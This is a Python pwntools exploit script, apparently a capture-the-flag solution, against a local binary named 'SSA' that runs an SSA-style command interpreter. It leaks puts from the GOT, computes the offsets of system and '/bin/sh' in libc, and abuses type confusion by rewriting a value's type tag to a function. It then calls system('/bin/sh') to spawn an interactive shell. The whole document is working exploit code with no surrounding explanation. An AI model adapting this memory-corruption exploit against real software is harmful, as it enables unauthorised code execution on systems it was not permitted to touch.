#!/usr/bin/env python3
from pwn import *

context(log_level="debug", arch="amd64")

io = process("./SSA")
elf = ELF("./SSA")
libc = ELF("./libc.so.6")


def cmd(c):
    io.sendlineafter(b"> ", c.encode())


# 计算各个函数偏移
offset_puts = elf.got["puts"] - elf.symbols["values"]
offset_system = libc.symbols["system"] - libc.symbols["puts"]
offset_binsh = next(libc.search(b"/bin/sh\x00")) - libc.symbols["puts"]
# log.info(f"offset_system: {offset_system}, offset_binsh: {offset_binsh}")

# cmd("phi 1 63 63")  # values[1] = values[63] (TYPE_PTR, 指向 values[0])
cmd(f"const 2 {offset_puts}")  # values[2] = offset_puts (TYPE_INT)
cmd("add 3 63 2")  # values[3] = values[63] + values[2] = ptr to puts@GOT
cmd("load 4 3")  # values[4] = *values[3] = puts@libc
cmd(f"const 5 {offset_system}")  # values[5] = offset_system (TYPE_INT)
cmd("add 6 4 5")  # values[6] = puts@libc + offset_system = system@libc
cmd(f"const 7 {offset_binsh}")  # values[7] = offset_binsh (TYPE_INT)
cmd("add 8 4 7")  # values[8] = puts@libc + offset_binsh = "/bin/sh"@libc
cmd("const 9 96")  # values[9] = 96 (offset of values[6] -> 6*16)
cmd("add 10 63 9")  # values[10] = ptr to values[6]
cmd("const 12 2")  # values[12] = 2 (TYPE_FUNC)
cmd("store 10 12")  # values[6].type = TYPE_FUNC
cmd("call 6 8")  # 调用 values[10](values[8]) → system("/bin/sh")
cmd("run")

io.interactive()
